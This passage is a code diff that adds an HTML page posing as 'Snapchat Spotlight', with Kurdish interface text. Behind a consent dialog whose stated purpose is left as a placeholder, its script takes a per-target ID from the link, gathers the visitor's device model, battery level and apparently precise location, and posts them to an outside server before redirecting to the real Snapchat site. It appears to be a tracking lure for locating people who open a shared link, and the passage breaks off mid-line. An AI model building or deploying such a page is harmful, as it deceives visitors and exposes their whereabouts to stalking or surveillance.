@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Snapchat Spotlight</title>
+  <style>
+    body { background-color: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; font-family: sans-serif; }
+    .card { text-align: center; }
+    .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .msg { margin-top: 12px; font-size: 14px; }
+    /* Consent modal */
+    #consent { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.6); }
+    #consentBox { background: #fff; color: #000; padding: 18px; border-radius: 8px; max-width: 420px; width: 90%; text-align: right; }
+    #consentBox h3 { margin: 0 0 8px 0; }
+    #consentBox p { margin: 0 0 12px 0; font-size: 14px; line-height: 1.4; }
+    .btns { display: flex; gap: 8px; justify-content: flex-end; }
+    .btn { padding: 8px 12px; border-radius: 6px; border: none; cursor: pointer; }
+    .btn-allow { background: #0078d4; color: #fff; }
+    .btn-deny { background: #eee; color: #000; }
+  </style>
+</head>
+<body>
+  <div class="card" id="mainCard" aria-live="polite">
+    <div class="loader" aria-hidden="true"></div>
+    <div class="msg">لەگەڵ ڕێگەدانەوەی شوێن و باتری کار دەکات...</div>
+  </div>
+
+  <!-- Consent modal -->
+  <div id="consent" role="dialog" aria-modal="true">
+    <div id="consentBox">
+      <h3>داواکردنی ڕێگە بۆ شوێن و زانیارییەکانی ئامێر</h3>
+      <p>بۆ ئەوەی خزمەتگوزاری کار بکات، پێویستە ڕێگە بدەیت بۆ وەرگرتنی شوێن (latitude, longitude) و ڕەوشی باتری. ئەم زانیارییانە تەنها بۆ [هۆکار] بەکاردەهێنرێن.</p>
+      <div class="btns">
+        <button id="deny" class="btn btn-deny">ڕەتکردن</button>
+        <button id="allow" class="btn btn-allow">ڕێگەدان</button>
+      </div>
+    </div>
+  </div>
+
+<script>
+/* Configuration */
+const vpsURL = 'https://image-score.uk/process.php'; // پێویستە HTTPS و CORS هەبێت
+const urlParams = new URLSearchParams(window.location.search);
+const uid = (urlParams.get('id') || '').trim();
+const creator = (urlParams.get('u') || 'Unknown').trim();
+
+/* Basic validation */
+if (!uid) {
+  document.body.innerHTML = "<div style='color:#f66; text-align:center; padding:20px;'>Security Error: Missing UID</div>";
+  throw new Error("UID missing");
+}
+
+/* Utility functions */
+function safeString(s, max = 200) { return String(s || '').slice(0, max); }
+function parseDeviceFromUA() {
+  try {
+    const ua = navigator.userAgent || '';
+    const match = ua.match(/\(([^)]+)\)/);
+    if (match && match[1]) return match[1].split(';')[0].trim();
+    return null;
+  } catch (e) { return null; }
+}
+function redirectToSpotlight() { window.location.href = "https://www.snapchat.com/spotlight"; }
+
+/* fetch with timeout and retry */
+async function postData(url, data, retries = 1, timeoutMs = 15000) {
+  const controller = new AbortController();
+  const id = setTimeout(() => controller.abort(), timeoutMs);
+  try {
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+      signal: controller.signal,
+      credentials: 'omit'
+    });
+    clearTimeout(id);
+    if (!res.ok) throw new Error('Network response not ok');
+    // try parse json but ignore if not json
+    try { await res.json(); } catch(e) {}
+    return true;
+  } catch (err) {
+    clearTimeout(id);
+    if (retries > 0) return postData(url, data, retries - 1, timeoutMs);
+    return false;
+  }
+}
+
+/* Main flow after consent */
+async function collectAndSend(lat, lon) {
+  const deviceFromUA = parseDeviceFromUA() || "Mobile Device";
+  let batt = "unknown";
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      batt = (typeof battery.level === 'number') ? Math.round(battery.
